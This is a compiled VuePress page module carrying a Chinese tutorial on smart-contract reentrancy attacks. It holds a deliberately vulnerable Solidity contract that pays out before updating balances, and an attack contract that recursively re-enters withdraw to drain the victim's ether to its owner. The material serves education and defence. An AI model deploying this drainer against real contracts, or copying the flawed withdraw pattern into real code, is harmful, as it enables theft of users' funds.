import{_ as a,K as t,L as p,a5 as e,W as n,F as c}from"./framework-edebdfe1.js";const o={},i=n('<h1 id="重入攻击" tabindex="-1"><a class="header-anchor" href="#重入攻击" aria-hidden="true">#</a> 重入攻击</h1><div class="hint-container warning"><p class="hint-container-title">DeeLMind 提示</p><p>漏洞复现，请注意版本。</p></div><h2 id="什么是重入攻击" tabindex="-1"><a class="header-anchor" href="#什么是重入攻击" aria-hidden="true">#</a> 什么是重入攻击</h2><p>重入攻击（Reentrancy Attack）是一种在智能合约开发中常见的安全漏洞，特别是在以太坊和其他支持智能合约的平台上。这种攻击利用了智能合约在执行过程中调用其他合约（或自身）的机制，导致不安全的状态更新。</p>',4),l=n(`<div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>

<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.17</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">VulnerableContract</span> <span class="token punctuation">{</span>
    <span class="token comment">// 对应每个用户的资产</span>
    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">private</span> userBalances<span class="token punctuation">;</span>

    <span class="token comment">// 存入资产</span>
    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        userBalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 取走资产</span>
    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span>  <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>userBalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> _amount<span class="token punctuation">,</span> <span class="token string">&quot;Amount LESSSSSS&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> _amount<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">&quot;Transfer failed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        userBalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _amount<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 获取当前用户的存入余额</span>
    <span class="token keyword">function</span> <span class="token function">getCurrentUserBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> userBalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 获取当前用户的存入余额</span>
    <span class="token keyword">function</span> <span class="token function">getUserBalance</span><span class="token punctuation">(</span><span class="token builtin">address</span> _address<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> userBalances<span class="token punctuation">[</span>_address<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 获取当前合约所有余额</span>
    <span class="token keyword">function</span> <span class="token function">getAllBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">AttackContract</span> <span class="token punctuation">{</span>
    VulnerableContract vulnerableContract<span class="token punctuation">;</span>
    <span class="token builtin">uint</span> <span class="token keyword">public</span> amountToWithdraw<span class="token punctuation">;</span>
    <span class="token builtin">address</span> owner<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _vulnerableContract<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        vulnerableContract <span class="token operator">=</span> <span class="token function">VulnerableContract</span><span class="token punctuation">(</span>_vulnerableContract<span class="token punctuation">)</span><span class="token punctuation">;</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 向合约存入一定数量的以太币</span>
    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        amountToWithdraw <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        vulnerableContract<span class="token punctuation">.</span>deposit<span class="token punctuation">{</span>value<span class="token punctuation">:</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 触发 Reentrancy 攻击</span>
    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span><span class="token punctuation">{</span>
        vulnerableContract<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span>amountToWithdraw<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 合约回调函数，当攻击合约接收到以太币时触发</span>
    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>vulnerableContract<span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">&gt;=</span> amountToWithdraw<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            vulnerableContract<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span>amountToWithdraw<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">// 提给自己</span>
            <span class="token keyword">payable</span><span class="token punctuation">(</span>owner<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function u(k,r){const s=c("DocsAD");return t(),p("div",null,[i,e(s),l])}const v=a(o,[["render",u],["__file","reentrancy.html.vue"]]);export{v as default};
